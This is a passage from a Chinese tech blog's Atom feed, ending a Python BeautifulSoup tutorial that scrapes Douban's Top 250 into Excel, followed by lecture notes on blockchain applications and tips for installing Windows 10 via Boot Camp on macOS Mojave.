&quot;douban-top250.xls&quot;)</span><br><span class="line">    xls_file = os.path.exists(path)</span><br><span class="line">    if xls_file:</span><br><span class="line">        os.remove(path)</span><br><span class="line">    wb = xlwt.Workbook(encoding=&#x27;utf-8&#x27;)</span><br><span class="line">    xls = wb.add_sheet(&#x27;top250&#x27;)</span><br><span class="line">    head = [&#x27;标题&#x27;, &#x27;图片地址&#x27;, &#x27;评分&#x27;, &#x27;简评&#x27;]  # 表头</span><br><span class="line">    row = 1</span><br><span class="line">    for h in range(len(head)):</span><br><span class="line">        xls.write(0, h, head[h])</span><br><span class="line">    xls, row = xls_save(xls, get_data(soup), 1)</span><br><span class="line">    nxt = next_url(soup)</span><br><span class="line">    while nxt:</span><br><span class="line">        soup = get_soup(url + nxt)</span><br><span class="line">        xls, row = xls_save(xls, get_data(soup), row)</span><br><span class="line">        nxt = next_url(soup)</span><br><span class="line">    wb.save(&#x27;douban-top250.xls&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;beautifulSoup 可以很方便的获取 html 页面的标签节点，而且也很容易获取到标签的属性和文本内容。我们就运用 beautifulSoup 来爬取同步加载页面数据，然后我们将获取到的数据存入到 excel 中。&lt;/p&gt;</summary>
    
    
    
    <category term="爬虫" scheme="https://blog.zhengxiangling.com/categories/%E7%88%AC%E8%99%AB/"/>
    
    
    <category term="beautifulSoup" scheme="https://blog.zhengxiangling.com/tags/beautifulSoup/"/>
    
    <category term="python" scheme="https://blog.zhengxiangling.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>区块链技术及应用现状</title>
    <link href="https://blog.zhengxiangling.com/2019/11/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%BA%94%E7%94%A8%E7%8E%B0%E7%8A%B6-1/"/>
    <id>https://blog.zhengxiangling.com/2019/11/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%BA%94%E7%94%A8%E7%8E%B0%E7%8A%B6-1/</id>
    <published>2019-11-06T02:52:00.000Z</published>
    <updated>2023-11-17T14:27:30.009Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>from 陈纯院士的讲座</p></blockquote><h2 id="区块链本质"><a href="#区块链本质" class="headerlink" title="区块链本质"></a>区块链本质</h2><h3 id="术语解释"><a href="#术语解释" class="headerlink" title="术语解释"></a>术语解释</h3><p>交易：交易指的是一次对账本的操作，如一笔转账交易。</p><p>区块：将一段时间内发生的所有交易和状态打包成为一个区块。</p><p>块链式数据结构（狭义区块链）：区块以时间顺序前后相连，组成一种块链式数据结构，及“区块链”一词的由来。</p><p>分布式账本（广义区块链）：多参与方各自部署，互联互通，构成分布式网络。</p><span id="more"></span><h3 id="三大支撑技术"><a href="#三大支撑技术" class="headerlink" title="三大支撑技术"></a>三大支撑技术</h3><p>共识算法：针对区块链上发生的交易，保障区块链所有节点数据一致性。</p><p>块链式数据结构：将一段时间内的交易数据打包成区块，再将多个区块按时间顺序有序链接的一种数据结构，用来确保数据的不可篡改性。</p><p>智能合约：一段部署在区块链上可自动运行的程序，可以自动化地执行预先定义好的规则和条款，通过减少人为干预的风险，提升交易的安全与可信任度。</p><h3 id="三种组织形态"><a href="#三种组织形态" class="headerlink" title="三种组织形态"></a>三种组织形态</h3><p>公有链：全球范围可以访问，不依赖于单个公司或辖区，匿名性强，任何参与者都可在中写入、读取、参与交易验证。</p><p>联盟链：联盟链仅限于联盟成员参与，系统内交易确认节点为事先设定，并通过共识机制确认。</p><p>私有链：仅在机构内使用，读写权、记账权由组织内自由定制。中心控制者制定可参与和进行交易验证成员范围。</p><h3 id="共识算法"><a href="#共识算法" class="headerlink" title="共识算法"></a>共识算法</h3><p>BFT(拜占庭容错算法)</p><ul><li><p>数学证明当且仅当三分之二以上的节点忠诚时，可以保证系统运行结果的正确性。</p></li><li><p>三大协议：</p><ul><li><p>三阶段共识协议：保证了主节点打包的区块通过三阶段共识完成打包结果的一致性确认</p></li><li><p>视图变更协议：保证了在主节点作恶情况下，系统可以通过该协议选举出新任的主节点进行共识，且不破坏其原有的共识状态</p></li><li><p>检查点机制：保证了各节点经过确认的一致性状态得以持久化</p><h3 id="行业分类"><a href="#行业分类" class="headerlink" title="行业分类"></a>行业分类</h3></li></ul></li></ul><p>币/模式：比特币 天秤币 Libra（Facebook发行） 摩根币 JPM（摩根大通发行）</p><p>链/技术：公有链 联盟链</p><h3 id="顶层设计"><a href="#顶层设计" class="headerlink" title="顶层设计"></a>顶层设计</h3><p>中共中央政治局10月24日下午就区块链技术发展现状和趋势进行第十八次集体学习。中共中央总书记习近平在主持学习时强调，区块链技术的集成应用在新的技术革新和产业变革中起着重要作用。我们要把区块链作为核心技术自主创新的重要突破口，明确主攻方向，加大投入力度，着力攻克一批关键核心技术，加快推动区块链技术和产业创新发展。</p><h4 id="产业应用"><a href="#产业应用" class="headerlink" title="产业应用"></a>产业应用</h4><ul><li><p>要推动区块链和实体经济深度融合，解决中小企业贷款融资难、银行风控难、部门监管难等问题。</p></li><li><p>要利用区块链技术探索数字经济模式创新。</p></li><li><p>要探索“区块链+”在民生领域的运用，积极推动区块链技术在教育、就业、养老、精准脱贫、医疗健康、商品防伪、食品安全、公益、社会救助等领域的应用，为人民群众提供更加智能、更加便捷、更加优质的公共服务。</p></li><li><p>要推动区块链底层技术服务和新型智慧城市建设相结合探索在信息基础设施、智慧交通、能源电力等领域的推广应用，提升城市管理的智能化、精准化水平。</p></li><li><p>要利用区块链技术促进城市间在信息、资金、人才、征信等方面更大规模的互联互通。</p></li><li><p>要探索利用区块链数据共享模式，实现政务数据跨部门、跨区域共同维护和利用，促进业务协同办理。</p></li></ul><h3 id="技术革新"><a href="#技术革新" class="headerlink" title="技术革新"></a>技术革新</h3><p>当下，各大互联网公司隐私泄露事件频出，一次次加深了公众对垄断性互联网公司的警惕，去中心化的区块链技术被认为是推倒垄断、走向平等的重要技术手段；利用区块链技术的链式存储结构，保证数据不可篡改，密码学保证用户隐私，共识算法保证数据权平等，区块链技术正在构建一个全新的分布式技术架构，成为新一代基础设施。</p><ul><li><p>提升多中心协作效率</p></li><li><p>去中介，提升多方信任</p></li><li><p>打破数据孤岛，提升数据应用效率</p></li><li><p>数据不可篡改，可追溯，可审计</p></li><li><p>自动执行预设，提升约束力，减少摩擦</p></li></ul><h3 id="三个阶段"><a href="#三个阶段" class="headerlink" title="三个阶段"></a>三个阶段</h3><p>可信计算与存储（数据可信）：数字存证 审计监管</p><p>数字化社会（资产可信）：资产数字化 数据资产化</p><p>分布式商业（合作可信）：多中心弱中介 激励生态化</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>1.业务协作：养老金托管</p><p>利用区块链统筹管理养老金业务信息，将养老金业务流程线上化，提升资金使用效率。</p><ul><li><p>实现养老金业务信息在参与机构之间快速同步</p></li><li><p>提高业务处理流程的透明度，增加数据可信度</p></li><li><p>减少业务处理周期，提高养老金申购赎回频率，提升资金使用率</p></li></ul><p>2.数字资产：信用保险</p><p>供应链企业通过信用险增信，使得信用风险得到更大范围的分散，满足企业低成本融资的诉求。</p><ul><li><p>为中小企业增信，缓解融资困难</p></li><li><p>标准化企业信用，实现风险缓释</p></li><li><p>实现供应链金融体系的信用穿透</p></li><li><p>助力完善社会信用体系</p></li></ul><p>3.存证溯源：可信存证</p><p>存证方通过区块链平台实现电子存证可信存储，任意相关方在线查阅验证。</p><ul><li><p>多方协同，随时调用，实现方便、快捷的可信电子存证</p></li><li><p>存证电子化，节约纸张成本</p></li><li><p>电子存证灵活对接，便于业务拓展</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;from 陈纯院士的讲座&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;区块链本质&quot;&gt;&lt;a href=&quot;#区块链本质&quot; class=&quot;headerlink&quot; title=&quot;区块链本质&quot;&gt;&lt;/a&gt;区块链本质&lt;/h2&gt;&lt;h3 id=&quot;术语解释&quot;&gt;&lt;a href=&quot;#术语解释&quot; class=&quot;headerlink&quot; title=&quot;术语解释&quot;&gt;&lt;/a&gt;术语解释&lt;/h3&gt;&lt;p&gt;交易：交易指的是一次对账本的操作，如一笔转账交易。&lt;/p&gt;
&lt;p&gt;区块：将一段时间内发生的所有交易和状态打包成为一个区块。&lt;/p&gt;
&lt;p&gt;块链式数据结构（狭义区块链）：区块以时间顺序前后相连，组成一种块链式数据结构，及“区块链”一词的由来。&lt;/p&gt;
&lt;p&gt;分布式账本（广义区块链）：多参与方各自部署，互联互通，构成分布式网络。&lt;/p&gt;</summary>
    
    
    
    <category term="区块链" scheme="https://blog.zhengxiangling.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="技术应用" scheme="https://blog.zhengxiangling.com/tags/%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>macOS Mojave 安装双系统 bug 总结</title>
    <link href="https://blog.zhengxiangling.com/2019/03/23/macOS-Mojave%E5%AE%89%E8%A3%85%E5%8F%8C%E7%B3%BB%E7%BB%9F-bug-%E6%80%BB%E7%BB%93/"/>
    <id>https://blog.zhengxiangling.com/2019/03/23/macOS-Mojave%E5%AE%89%E8%A3%85%E5%8F%8C%E7%B3%BB%E7%BB%9F-bug-%E6%80%BB%E7%BB%93/</id>
    <published>2019-03-23T01:24:00.000Z</published>
    <updated>2023-11-17T14:27:30.006Z</updated>
    
    <content type="html"><![CDATA[<p>  在 mac 上装 windows10 双系统一般是由于    </p><ol><li><p>开发的需要，有些系统级的架构只支持windows，不适合在 mac 上开发。</p></li><li><p>运行的游戏只支持 windows，无法在 mac 上运行。    </p><p>macOS Mojave 只支持安装 windows10，往下的版本不再支持。<code>启动转移助理（BootCamp）</code>的功能目前也限制于制作双系统和将双系统恢复为单一分区，取消了之前支持windows多版本和制作u盘启动盘的选项。不过目前仍可用代码来制作u盘启动盘。</p></li></ol><p>在 mac 上用 windows10 u盘启动盘来安装双系统是行不通的，因为会导致缺少驱动而不能往下安装，所以就只能走<code>启动转移助理</code>这条路。<br>windows10 经常更新版本，导致 mac 使用<code>启动转移助理</code>安装双系统时会出现各种各样的问题。列举如下：    </p><ol><li>版本问题。用 macOS Mojave 10.14版本只能安装 windows10 4月版的，安装10月版的会出现错误。将macOS Mojave升级到 10.14.3版本解决版本问题。</li><li>外接设备导致无法安装 windows 的问题。当进入到 windows 安装界面时，必须把所有外接设备（鼠标、u盘等）全部拔出，不然会出现分区找不到的错误导致无法安装 windows。</li><li>一旦将 windows 安装完毕之后，分配的硬盘空间将无法调整，所以分磁盘空间的时候必须考虑清楚。</li><li>用 mac 上的<code>磁盘工具</code>直接将 windows 分区抹除再合并分区，可能会导致下次安装 windows 失败，所以要删掉之前安装好的 windows 的办法是用<code>启动转移助理</code>将 windows 合并成单一分区。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  在 mac 上装 windows10 双系统一般是由于    &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;开发的需要，有些系统级的架构只支持windows，不适合在 mac 上开发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;运行的游戏只支持 windows，无法在 mac 上运行。  </summary>
      
    
    
    
    <category term="系统" scheme="https://blog.zhengxiangling.com/categories/%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="macOS" scheme="https://blog.zhengxiangling.com/tags/macOS/"/>
    
  </entry>
  
</feed>
